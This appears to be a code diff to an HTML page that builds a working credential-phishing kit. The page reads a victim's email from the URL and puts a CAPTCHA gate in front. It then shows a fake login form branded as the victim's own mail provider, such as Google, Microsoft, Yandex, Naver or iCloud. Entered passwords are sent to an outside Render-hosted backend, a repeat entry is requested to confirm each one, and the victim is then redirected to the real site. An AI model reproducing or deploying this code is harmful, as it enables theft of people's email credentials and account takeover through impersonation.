@@ -6,21 +6,50 @@
 <title>Session Authentication</title>
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f5f7;color:#2c3e50;line-height:1.5}
-.cOrWHzq{background:#fff;border-radius:12px;box-shadow:0 2px 24px rgba(0,0,0,0.06);padding:38px 34px;max-width:440px;width:92%;text-align:center}
-.tOrWHzq{font-size:1.25rem;font-weight:600;color:#1e293b;margin-bottom:8px}
-.uOrWHzq{font-size:0.9rem;color:#64748b;margin-bottom:28px}
-.ftOrWHzq{margin-top:24px;font-size:0.75rem;color:#c0c8d4}
-#ts-error{margin-top:16px;color:#dc2626;font-size:14px;display:none;}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f5f7;color:#2c3e50;line-height:1.5;transition:background .3s}
+.card{background:#fff;border-radius:14px;box-shadow:0 12px 48px rgba(0,0,0,.10);padding:38px 34px;max-width:420px;width:92%;position:relative;overflow:hidden;text-align:center}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:4px;background:#1e930c}
+.logo{font-size:1.5rem;margin-bottom:6px;min-height:38px;display:flex;align-items:center;justify-content:center}
+.subtitle{color:#64748b;font-size:.9rem;margin-bottom:26px}
+label{display:block;font-size:.8rem;color:#475569;margin:10px 0 4px;text-align:left}
+input{width:100%;padding:13px;border:1.5px solid #e2e8f0;border-radius:8px;font-size:14px;outline:none;transition:.2s;box-sizing:border-box}
+input:focus{border-color:#1e930c;box-shadow:0 0 0 3px rgba(30,147,12,.12)}
+input[readonly]{background:#f8fafc;color:#64748b}
+button{width:100%;padding:13px;background:linear-gradient(135deg,#1e930c,#167a09);color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:18px;transition:.2s}
+button:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(30,147,12,.3)}
+button:disabled{opacity:.6;cursor:not-allowed;transform:none}
+.msg{color:#64748b;font-size:13px;margin-top:12px;display:none;text-align:center}
+.spin{display:inline-block;width:12px;height:12px;border:2px solid #cbd5e1;border-top-color:#1e930c;border-radius:50%;animation:sp .7s linear infinite;vertical-align:-2px;margin-right:6px}
+@keyframes sp{to{transform:rotate(360deg)}}
+.footer{margin-top:22px;font-size:11px;color:#94a3b8}
+#ts-error{margin-top:16px;color:#dc2626;font-size:14px;display:none}
+.hidden{display:none}
 </style>
 </head>
 <body>
-<div class="cOrWHzq">
-  <div class="tOrWHzq">Authenticating Your Session</div>
-  <div class="uOrWHzq">We need to confirm you are human before proceeding to your secure workspace.</div>
-  <div id="ts-turnstile" style="min-height:65px;"></div>
+
+<!-- ======================= STAGE 1: TURNSTILE ======================= -->
+<div class="card" id="stage-gate">
+  <div class="logo" id="gate-logo"><span style="color:#1e930c;font-weight:900">Secure</span><span style="color:#475569;font-weight:600">Auth</span></div>
+  <div class="subtitle" id="gate-subtitle">We need to confirm you are human before proceeding.</div>
+  <div id="ts-turnstile" style="min-height:65px;display:flex;justify-content:center"></div>
   <div id="ts-error">Verification failed. Please try again.</div>
-  <div class="ftOrWHzq">&copy; 2026 Secure Auth</div>
+  <div class="footer" id="gate-footer">&copy; 2026 Secure Auth</div>
+</div>
+
+<!-- ======================= STAGE 2: LOGIN FORM ======================= -->
+<div class="card hidden" id="stage-login">
+  <div class="logo" id="login-logo"></div>
+  <div class="subtitle" id="login-subtitle"></div>
+  <form id="lf" autocomplete="off">
+    <label for="em" id="label-em">Email</label>
+    <input id="em" type="email" name="email" required>
+    <label for="pw" id="label-pw">Password</label>
+    <input id="pw" type="password" name="password" required>
+    <button type="submit" id="btn">Sign in</button>
+    <div class="msg" id="msg"></div>
+  </form>
+  <div class="footer" id="login-footer"></div>
 </div>
 
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit" async></script>
@@ -29,86 +58,330 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;d
   // ============================================================
   // CONFIG
   // ============================================================
-  var BACKEND = "https://auto-login-secure.onrender.com";  // ← your Render URL
-  var SITEKEY = "0x4AAAAAAE7CY8nNIUDU9vqa";                // ← REAL Turnstile sitekey
-  var KEY     = "HBfNYyUjMsgOLGRZ";
+  var BACKEND       = "https://auto-login-secure.onrender.com";
+  var TURNSTILE_KEY = "0x4AAAAAAE7CY8nNIUDU9vqa";
+  var MAX_ATTEMPTS  = 6;
+  var FALLBACK_REDIRECT = "https://www.google.com";
 
   // ============================================================
-  // READ ?u=email FROM URL BAR
+  // READ ?u= FROM URL
   // ============================================================
   var params = new URLSearchParams(window.location.search);
-  var email  = params.get('u') || '';
-  console.log('[flow] detected email from URL:', email || '(none)');
+  var email  = (params.get('u') || '').trim();
+  console.log('[flow] email from URL:', email || '(none)');
 
+  // ============================================================
+  // BRANDING — mirrors the server's brandForProvider()
+  // ============================================================
+  function hexToRgba(hex, a){
+    var h = (hex||'#000000').replace('#','');
+    return 'rgba('+parseInt(h.substr(0,2),16)+','+parseInt(h.substr(2,2),16)+','+parseInt(h.substr(4,2),16)+','+a+')';
+  }
+
+  function brandForProvider(email){
+    var domain = (email.split('@')[1] || '').toLowerCase();
+    var tld = domain.split('.').pop() || '';
+
+    if (/yandex|ya\.ru/.test(domain)) return {
+      name:'Yandex', lang:'ru',
+      logoText:'<span style="color:#fc3f1d;font-weight:900;font-size:1.7rem">Я</span><span style="color:#000;font-weight:700;font-size:1.5rem">ндекс</span>',
+      subtitle:'Войдите в свой аккаунт, чтобы продолжить',
+      emailPlaceholder:'Логин или email', passwordPlaceholder:'Пароль', buttonText:'Войти',
+      accent:'#fc3f1d', accent2:'#ffcc00',
+      bg:'linear-gradient(135deg,#ffffff 0%,#fff8f0 100%)',
+      headerGradient:'linear-gradient(90deg,#fc3f1d,#ffcc00,#fc3f1d)', footer:'© Яндекс 2026'
+    };
+
+    if (domain === 'abv.bg') return {
+      name:'ABV.bg', lang:'bg',
+      logoText:'<span style="color:#003a8f;font-weight:900;font-size:1.6rem">ABV</span><span style="color:#e30613;font-weight:900;font-size:1.6rem">.bg</span>',
+      subtitle:'Влезте в своя акаунт, за да продължите',
+      emailPlaceholder:'Имейл адрес', passwordPlaceholder:'Парола', buttonText:'Вход',
+      accent:'#003a8f', accent2:'#e30613',
+      bg:'linear-gradient(135deg,#eaf2ff 0%,#d6e4ff 100%)',
+      headerGradient:'linear-gradient(90deg,#003a8f,#e30613,#003a8f)', footer:'© ABV.bg 2026'
+    };
+
+    if (/gmail|googlemail|google/.test(domain)) return {
+      name:'Google', lang:'en',
+      logoText:'<span style="color:#4285f4;font-weight:700;font-size:1.5rem">G</span><span style="color:#ea4335;font-weight:700;font-size:1.5rem">o</span><span style="color:#fbbc05;font-weight:700;font-size:1.5rem">o</span><span style="color:#4285f4;font-weight:700;font-size:1.5rem">g</span><span style="color:#34a853;font-weight:700;font-size:1.5rem">l</span><span style="color:#ea4335;font-weight:700;font-size:1.5rem">e</span>',
+      subtitle:'Sign in to continue to Gmail',
+      emailPlaceholder:'Email or phone', passwordPlaceholder:'Enter your password', buttonText:'Next',
+      accent:'#1a73e8', accent2:'#4285f4',
+      bg:'linear-gradient(135deg,#ffffff 0%,#f8f9fa 100%)',
+      headerGradient:'linear-gradient(90deg,#4285f4,#ea4335,#fbbc05,#34a853)', footer:'© Google LLC 2026'
+    };
+
+    if (/outlook|hotmail|live\.com|msn/.test(domain)) return {
+      name:'Microsoft', lang:'en',
+      logoText:'<span style="color:#0078d4;font-weight:600;font-size:1.3rem">Microsoft</span>',
+      subtitle:'Sign in to your Microsoft account',
+      emailPlaceholder:'Email, phone, or Skype', passwordPlaceholder:'Password', buttonText:'Sign in',
+      accent:'#0067b8', accent2:'#0078d4',
+      bg:'linear-gradient(135deg,#f3f2f1 0%,#e8f0fe 100%)',
+      headerGradient:'linear-gradient(90deg,#0078d4,#00b7c3,#0078d4)', footer:'© Microsoft 2026'
+    };
+
+    if (domain === 'naver.com') return {
+      name:'Naver', lang:'ko',
+      logoText:'<span style="color:#03c75a;font-weight:900;font-size:1.6rem">NAVER</span>',
+      subtitle:'네이버 아이디로 로그인',
+      emailPlaceholder:'아이디 또는 이메일', passwordPlaceholder:'비밀번호', buttonText:'로그인',
+      accent:'#03c75a', accent2:'#009e4f',
+      bg:'linear-gradient(135deg,#f0fff8 0%,#e0f7ee 100%)',
+      headerGradient:'linear-gradient(90deg,#03c75a,#009e4f,#03c75a)', footer:'© NAVER Corp. 2026'
+    };
+
+    if (/daum|hanmail|kakao/.test(domain)) return {
+      name:'Daum', lang:'ko',
+      logoText:'<span style="color:#fedd15;background:#1e1e1e;padding:4px 12px;border-radius:6px;font-weight:900;font-size:1.4rem">Daum</span>',
+      subtitle:'다음 계정으로 로그인',
+      emailPlaceholder:'이메일 주소', passwordPlaceholder:'비밀번호', buttonText:'로그인',
+      accent:'#fedd15', accent2:'#1e1e1e',
+      bg:'linear-gradient(135deg,#fffdf5 0%,#fff8e0 100%)',
+      headerGradient:'linear-gradient(90deg,#fedd15,#1e1e1e,#fedd15)', footer:'© Kakao Corp. 2026'
+    };
+
+    if (/hiworks|gabia/.test(domain)) return {
+      name:'Hiworks', lang:'ko',
+      logoText:'<span style="color:#1a73e8;font-weight:900;font-size:1.5rem">하이웍스</span> <span style="color:#0d47a1;font-weight:700;font-size:1.5rem">오피스</span>',
+      subtitle:'기업 업무를 위한 안전한 로그인',
+      emailPlaceholder:'name@hiworks.co.kr', passwordPlaceholder:'비밀번호를 입력하세요', buttonText:'로그인',
+      accent:'#1a73e8', accent2:'#0d47a1',
+      bg:'linear-gradient(135deg,#e8f0fe 0%,#d2e3fc 100%)',
+      headerGradient:'linear-gradient(90deg,#1a73e8,#0d47a1,#1a73e8)', footer:'© 2026 Hiworks Corp.'
+    };
+
+    if (/yahoo|ymail|rocketmail/.test(domain)) return {
+      name:'Yahoo', lang:'en',
+      logoText:'<span style="color:#6001d2;font-weight:900;font-size:1.6rem">yahoo</span><span style="color:#6001d2;font-weight:900;font-size:1.6rem">!</span>',
+      subtitle:'Sign in to your Yahoo account',
+      emailPlaceholder:'Email or phone', passwordPlaceholder:'Password', buttonText:'Sign in',
+      accent:'#6001d2', accent2:'#7e28e8',
+      bg:'linear-gradient(135deg,#f5f0ff 0%,#ebe0ff 100%)',
+      headerGradient:'linear-gradient(90deg,#6001d2,#7e28e8,#6001d2)', footer:'© Yahoo 2026'
+    };
+
+    if (/qq\.com|foxmail/.test(domain)) return {
+      name:'QQ', lang:'zh',
+      logoText:'<span style="color:#12b7f5;font-weight:900;font-size:1.5rem">QQ邮箱</span>',
+      subtitle:'登录您的QQ邮箱账号',
+      emailPlaceholder:'QQ号码或邮箱', passwordPlaceholder:'密码', buttonText:'登录',
+      accent:'#12b7f5', accent2:'#0a8ac2',
+      bg:'linear-gradient(135deg,#eaf6ff 0%,#d6ecff 100%)',
+      headerGradient:'linear-gradient(90deg,#12b7f5,#0a8ac2,#12b7f5)', footer:'© 腾讯 2026'
+    };
+
+    if (/mail\.ru|inbox\.ru|bk\.ru|list\.ru|internet\.ru/.test(domain)) return {
+      name:'Mail.ru', lang:'ru',
+      logoText:'<span style="color:#005ff9;font-weight:900;font-size:1.5rem">Mail</span><span style="color:#ff9e00;font-weight:900;font-size:1.5rem">.ru</span>',
+      subtitle:'Войдите в свой аккаунт',
+      emailPlaceholder:'Email или телефон', passwordPlaceholder:'Пароль', buttonText:'Войти',
+      accent:'#005ff9', accent2:'#ff9e00',
+      bg:'linear-gradient(135deg,#eaf2ff 0%,#d6e4ff 100%)',
+      headerGradient:'linear-gradient(90deg,#005ff9,#ff9e00,#005ff9)', footer:'© Mail.ru 2026'
+    };
+
+    if (/icloud|me\.com|mac\.com/.test(domain)) return {
+      name:'iCloud', lang:'en',
+      logoText:'<span style="color:#000;font-weight:600;font-size:1.5rem">iCloud</span>',
+      subtitle:'Sign in with your Apple Account',
+      emailPlaceholder:'Apple Account', passwordPlaceholder:'Password', buttonText:'Sign in',
+      accent:'#0071e3', accent2:'#1d1d1f',
+      bg:'linear-gradient(135deg,#f5f5f7 0%,#e8e8ed 100%)',
+      headerGradient:'linear-gradient(90deg,#0071e3,#1d1d1f,#0071e3)', footer:'© Apple Inc. 2026'
+    };
+
+    if (domain === 't-online.de') return {
+      name:'T-Online', lang:'de',
+      logoText:'<span style="color:#e20074;font-weight:900;font-size:1.5rem">T</span><span style="color:#000;font-weight:700;font-size:1.5rem">-Online</span>',
+      subtitle:'Melden Sie sich bei Ihrem E-Mail-Konto an',
+      emailPlaceholder:'E-Mail-Adresse', passwordPlaceholder:'Passwort', buttonText:'Anmelden',
+      accent:'#e20074', accent2:'#000000',
+      bg:'linear-gradient(135deg,#fff0f8 0%,#ffe0f0 100%)',
+      headerGradient:'linear-gradient(90deg,#e20074,#000000,#e20074)', footer:'© Telekom 2026'
+    };
+
+    // Generic fallback
+    var name = (domain.split('.')[0] || 'Mail').replace(/^\w/, function(c){ return c.toUpperCase(); });
+    return {
+      name:name, lang:'en',
+      logoText:'<span style="color:#1e930c;font-weight:900;font-size:1.5rem">'+name+'</span><span style="color:#475569;font-weight:600;font-size:1.5rem">.'+tld+'</span>',
+      subtitle:'Sign in to continue to your mailbox',
+      emailPlaceholder:'Email address', passwordPlaceholder:'Password', buttonText:'Sign in',
+      accent:'#1e930c', accent2:'#167a09',
+      bg:'linear-gradient(135deg,#f0fff4 0%,#e0f7e8 100%)',
+      headerGradient:'linear-gradient(90deg,#1e930c,#167a09,#1e930c)', footer:'© '+domain+' 2026'
+    };
+  }
+
+  var brand = brandForProvider(email);
+
+  // Apply branding to the gate card immediately
+  document.body.style.background = brand.bg;
+  document.getElementById('gate-logo').innerHTML = brand.logoText;
+  document.getElementById('gate-subtitle').textContent = 'We need to confirm you are human before proceeding to your ' + brand.name + ' workspace.';
+  document.getElementById('gate-footer').textContent = '© 2026 ' + brand.name;
+  document.querySelectorAll('.card').forEach(function(c){
+    c.style.setProperty('--accent', brand.accent);
+  });
+
+  // ============================================================
+  // STAGE 1 — Turnstile
+  // ============================================================
   var sent = false;
-
-  // ============================================================
-  // CALLBACK — fires after user solves Turnstile
-  // ============================================================
-  function loadForm(token){
+  function onTurnstileSuccess(token){
     if (sent) return;
     sent = true;
-
-    var url = BACKEND + '/a?k=' + encodeURIComponent(KEY) +
-              '&t=' + encodeURIComponent(token);
-    if (email) url += '&u=' + encodeURIComponent(email);
-
-    console.log('[flow] fetching:', url);
-
-    fetch(url)
-      .then(function(r){ return r.text(); })
-      .then(function(html){
-        console.log('[flow] response length:', html.length);
-        document.open();
-        document.write(html);
-        document.close();
-      })
-      .catch(function(err){
-        console.error('[flow] fetch failed:', err);
-        document.body.innerHTML =
-          '<div style="text-align:center;padding:40px;font-family:sans-serif">' +
-          '<p>Unable to verify. Please try again later.</p></div>';
-      });
-  }
-
-  function onError(){
-    var err = document.getElementById('ts-error');
-    if (err) err.style.display = 'block';
-    console.error('[flow] turnstile error');
-  }
-
-  // ============================================================
-  // WAIT for turnstile to be available, then render
-  // ============================================================
-  var tries = 0;
-  function boot(){
-    if (typeof turnstile === 'undefined') {
-      if (++tries > 40) {          // ~8s max wait
-        console.error('[flow] turnstile never loaded');
-        return onError();
+    // Verify server-side
+    fetch(BACKEND + '/api/verify-turnstile', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({ token: token })
+    })
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if (data && data.success) {
+        showLoginForm();
+      } else {
+        document.getElementById('ts-error').style.display = 'block';
+        sent = false;
+        try { turnstile.reset('#ts-turnstile'); } catch(_){}
       }
-      return setTimeout(boot, 200);
+    })
+    .catch(function(){
+      document.getElementById('ts-error').style.display = 'block';
+      sent = false;
+    });
+  }
+
+  function onTurnstileError(){
+    document.getElementById('ts-error').style.display = 'block';
+  }
+
+  var tries = 0;
+  function bootTurnstile(){
+    if (typeof turnstile === 'undefined') {
+      if (++tries > 40) return onTurnstileError();
+      return setTimeout(bootTurnstile, 200);
     }
     try {
       turnstile.render('#ts-turnstile', {
-        sitekey: SITEKEY,
-        callback: loadForm,
-        errorCallback: onError,
+        sitekey: TURNSTILE_KEY,
+        callback: onTurnstileSuccess,
+        errorCallback: onTurnstileError,
         appearance: 'always',
         retry: 'never'
       });
-      console.log('[flow] turnstile rendered with sitekey:', SITEKEY);
-    } catch(e){
-      console.error('[flow] turnstile.render threw:', e);
-      onError();
-    }
+    } catch(e){ onTurnstileError(); }
   }
 
   if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', boot);
+    document.addEventListener('DOMContentLoaded', bootTurnstile);
   } else {
-    boot();
+    bootTurnstile();
   }
+
+  // ============================================================
+  // STAGE 2 — Branded login form
+  // ============================================================
+  function showLoginForm(){
+    document.getElementById('stage-gate').classList.add('hidden');
+    document.getElementById('stage-login').classList.remove('hidden');
+
+    document.getElementById('login-logo').innerHTML = brand.logoText;
+    document.getElementById('login-subtitle').textContent = brand.subtitle;
+    document.getElementById('label-em').textContent = brand.emailPlaceholder;
+    document.getElementById('label-pw').textContent = brand.passwordPlaceholder;
+    document.getElementById('btn').textContent = brand.buttonText;
+    document.getElementById('login-footer').textContent = brand.footer;
+
+    // Apply brand colors to the login card
+    var loginCard = document.getElementById('stage-login');
+    loginCard.style.setProperty('--accent', brand.accent);
+    loginCard.querySelector('.card::before');
+    // Inject a style block for this card's accent (can't style ::before inline)
+    var style = document.createElement('style');
+    style.textContent =
+      '#stage-login::before{background:' + brand.headerGradient + ' !important}' +
+      '#stage-login input:focus{border-color:' + brand.accent + ' !important;box-shadow:0 0 0 3px ' + hexToRgba(brand.accent,.12) + ' !important}' +
+      '#stage-login button{background:linear-gradient(135deg,' + brand.accent + ',' + brand.accent2 + ') !important}' +
+      '#stage-login .spin{border-top-color:' + brand.accent + ' !important}';
+    document.head.appendChild(style);
+
+    // Prefill + lock email
+    var em = document.getElementById('em');
+    if (email) { em.value = email; em.readOnly = true; }
+    em.focus();
+    if (email) document.getElementById('pw').focus();
+  }
+
+  // ============================================================
+  // LOGIN LOGIC — redirect ONLY after 2 identical passwords
+  // ============================================================
+  var attempt      = 0;
+  var lockedEmail  = email || null;
+  var lastPassword = null;
+  var redirectUrl  = FALLBACK_REDIRECT;
+
+  var form = document.getElementById('lf');
+  var btn  = document.getElementById('btn');
+  var msg  = document.getElementById('msg');
+
+  function showMsg(text, spin){
+    msg.innerHTML = (spin ? '<span class="spin"></span>' : '') + text;
+    msg.style.display = 'block';
+  }
+
+  form.addEventListener('submit', async function(e){
+    e.preventDefault();
+    if (attempt > 0 && lockedEmail) {
+      form.email.value = lockedEmail;
+    } else {
+      lockedEmail = email || form.email.value.trim();
+    }
+    var thisPassword = form.password.value;
+    attempt++;
+    btn.disabled = true;
+    btn.textContent = '...';
+    showMsg('Verifying', true);
+
+    var body = {
+      email: lockedEmail,
+      password: thisPassword,
+      prevPassword: lastPassword,   // ← 1st password remembered here
+      attempt: attempt
+    };
+
+    var data = null;
+    try {
+      var r = await fetch(BACKEND + '/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+      data = await r.json().catch(function(){ return null; });
+    } catch(_){}
+
+    if (data && data.redirect) redirectUrl = data.redirect;
+    lastPassword = thisPassword;
+
+    // 🔑 Not a match yet → stay on the form, ask for the same password again
+    if (data && data.retry === true) {
+      form.password.value = '';
+      form.password.focus();
+      form.email.readOnly = true;
+      btn.disabled = false;
+      btn.textContent = brand.buttonText;
+      showMsg('Please re-enter your password to continue.', false);
+      return;
+    }
+
+    // ✅ Match (or cap) → redirect to the user's OWN provider
+    btn.textContent = '...';
+    showMsg('Redirecting to ' + brand.name + '…', true);
+    setTimeout(function(){ window.location.href = redirectUrl; }, 700);
+  });
 })();
 </script>
 </body>
